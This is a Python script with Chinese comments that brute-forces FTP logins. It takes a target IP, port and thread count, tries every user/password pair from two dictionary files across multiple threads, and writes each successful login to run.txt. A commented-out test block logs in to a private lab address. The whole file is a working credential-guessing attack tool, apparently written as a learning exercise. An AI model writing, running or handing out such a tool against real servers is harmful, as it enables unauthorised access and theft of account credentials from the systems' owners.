import  ftplib      #FTP模块
import sys          #用户输入模块
import threading    #多线程模块
import queue        #传参


'''
#登录实验
ftp=ftplib.FTP()            #设置FTP对象
ftp.connect('192.168.197.129',21)             #设置IP和端口
ftp.login("pc","pc")                #设置连接的用户名和密码
ls =ftp.retrlines('list')           #获取当前列表的内容
print(ls)
'''




#ftp爆破：IP、端口、线程


def ftp_burt(ip,port):
    ftp = ftplib.FTP()  # 设置FTP对象
    ftp.connect(ip,int(port))  # 设置IP和端口
    while not q.empty():                                    #判断接受字符q不为空的时候
        uspa_data=q.get()                                    #接受传参
        uspa_data=uspa_data.split('|')                      #通过|来切片数据
        users=uspa_data[0]                                  #提取|前面的数据赋值给users
        passs=uspa_data[1]                                  #提取后面的数据赋值给passs

        try:                                                    #异常处理
            ftp.login(users,passs)                          # 设置连接的用户名和密码
            #ls = ftp.retrlines('list')                       # 获取当前列表的内容
            #print(ls)
            print("用户名："+users+"  密码："+passs)             #查看用户和密码是否组合成功#读取ftp信息
            with open(r'run.txt', 'a+') as f:                   # 打开一个文本文档（如果没有就创建一个）
                f.write(("用户名："+users+"  密码："+passs)+ '\n')  # 每写完一行进行换行
                f.close()                                        #关闭打开的文件
        except ftplib.all_errors:                               #如果ftp请求出现错误就跳出一下
            pass




if __name__ == '__main__':

    #用户输入模块
    ip = sys.argv[1]
    port = sys.argv[2]
    xc = sys.argv[3]

    #传参模块
    q = queue.Queue()  # 创建数据传输对象
    for users in open('user_data.txt'):
        for passs in open('pass_data.txt'):  # 打开pass字典
            users = users.replace('\n', '')  # 把文档中的换行符转换成空
            passs = passs.replace('\n', '')
            q.put(users + '|' + passs)          # 把提取好的user和passs传输出去

    #多线程模块
    for x in range(int(xc)):                                     #循环多少次等于调用多少线程
        tp=threading.Thread(target=ftp_burt,args=(ip,int(port)))              #输入执行线程的函数
        tp.start()                                          #执行




